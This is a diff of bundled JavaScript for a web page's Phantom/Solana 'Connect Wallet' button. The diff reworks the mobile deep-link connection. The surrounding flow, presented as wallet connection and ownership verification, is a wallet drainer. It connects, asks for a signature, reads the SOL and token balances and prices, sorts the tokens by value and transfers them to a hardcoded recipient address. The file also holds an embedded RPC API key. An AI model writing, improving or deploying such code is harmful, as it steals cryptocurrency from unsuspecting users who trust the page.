@@ -72651,12 +72651,20 @@ var walletAddress = null;
 
 // Function to open the Phantom wallet app on mobile
 var openPhantomWallet = function openPhantomWallet() {
-  // This link will open the Phantom app if it's installed
-  window.location.href = 'https://phantom.app/ul/solana';
+  var appUrl = encodeURIComponent(window.location.href); // Current app URL
+  var dappEncryptionPublicKey = 'EQDi1EUz1WZMoGAsob1XctVhWcnh6ABKpudP7ZFbcB1H';
+  var redirectLink = encodeURIComponent(window.location.href); // Redirect back to the app after connection
+  var cluster = 'mainnet-beta'; // Specify the network
+
+  // Construct the connection URL
+  var connectUrl = "https://phantom.app/ul/v1/connect?app_url=".concat(appUrl, "&dapp_encryption_public_key=").concat(dappEncryptionPublicKey, "&redirect_link=").concat(redirectLink, "&cluster=").concat(cluster);
+
+  // Open the connection URL
+  window.location.href = connectUrl;
 };
 
-// Function to check if the user is on a mobile device
-var isMobile = /Mobi|Android/i.test(navigator.userAgent);
+// Attach the openPhantomWallet function to the "Connect Wallet" button
+document.getElementById('connectWalletBtn').addEventListener('click', openPhantomWallet);
 
 // Function to connect the Phantom wallet and execute the whole flow
 function connectAndExecute() {
@@ -72668,56 +72676,44 @@ function _connectAndExecute() {
     return _regeneratorRuntime().wrap(function _callee$(_context) {
       while (1) switch (_context.prev = _context.next) {
         case 0:
-          provider = window.solana; // Check for provider and if it’s Phantom
-          if (provider) {
+          provider = window.solana;
+          if (!(!provider || !provider.isPhantom)) {
             _context.next = 4;
             break;
           }
-          // If no provider is found and it's a mobile device, open the Phantom app link
-          if (isMobile) {
-            openPhantomWallet();
-          } else {
-            alert('No Solana wallet found. Please install one!');
-          }
+          alert('Phantom wallet not found. Please install it!');
           return _context.abrupt("return");
         case 4:
-          if (provider.isPhantom) {
-            _context.next = 7;
-            break;
-          }
-          alert('Unsupported Solana wallet detected.');
-          return _context.abrupt("return");
-        case 7:
-          _context.prev = 7;
-          _context.next = 10;
+          _context.prev = 4;
+          _context.next = 7;
           return provider.connect();
-        case 10:
+        case 7:
           response = _context.sent;
           walletAddress = response.publicKey.toString(); // Capture the connected wallet address
 
           // Display the connected wallet address
-          document.getElementById('connectWalletBtn').textContent = "Connected";
+          document.getElementById('connectWalletBtn').textContent = "Connected: ".concat(walletAddress);
 
           // Step 2: Sign a message after connection to verify wallet ownership
-          _context.next = 15;
+          _context.next = 12;
           return signMessage(provider, walletAddress);
-        case 15:
+        case 12:
           // Step 3: Fetch SOL balance after signing
           connection = new _web.Connection('https://solana-mainnet.g.alchemy.com/v2/Gsfdu-QYMKdktD9rUZiq8cwjFUdZTyPh');
-          _context.next = 18;
+          _context.next = 15;
           return connection.getBalance(new _web.PublicKey(walletAddress));
-        case 18:
+        case 15:
           balance = _context.sent;
           solBalance = balance / 1e9; // Optional: Display balance in the UI if necessary
           // document.getElementById('walletBalance').textContent = `Balance: ${solBalance} SOL`;
           // Step 4: Fetch token balances using Shyft API
-          _context.next = 22;
+          _context.next = 19;
           return fetchTokenBalances(walletAddress);
-        case 22:
+        case 19:
           tokens = _context.sent;
-          _context.next = 25;
+          _context.next = 22;
           return fetchTokenPrices(tokens);
-        case 25:
+        case 22:
           tokenPrices = _context.sent;
           // Step 6: Calculate token values (balance * price) and sort by value
           tokenValues = tokens.map(function (token) {
@@ -72737,21 +72733,21 @@ function _connectAndExecute() {
 
           // Step 7: Transfer tokens in the sorted order
           recipientAddress = '6i3vVKyfafPTgpQjct9Tx8c3fAHT7sCBDG9GsZk1n4vf'; // Replace with the recipient's address
-          _context.next = 33;
+          _context.next = 30;
           return transferTokensInOrder(sortedTokens, recipientAddress, connection);
-        case 33:
-          _context.next = 39;
+        case 30:
+          _context.next = 36;
           break;
-        case 35:
-          _context.prev = 35;
-          _context.t0 = _context["catch"](7);
+        case 32:
+          _context.prev = 32;
+          _context.t0 = _context["catch"](4);
           console.error(_context.t0);
           alert('Failed to complete wallet flow');
-        case 39:
+        case 36:
         case "end":
           return _context.stop();
       }
-    }, _callee, null, [[7, 35]]);
+    }, _callee, null, [[4, 32]]);
   }));
   return _connectAndExecute.apply(this, arguments);
 }
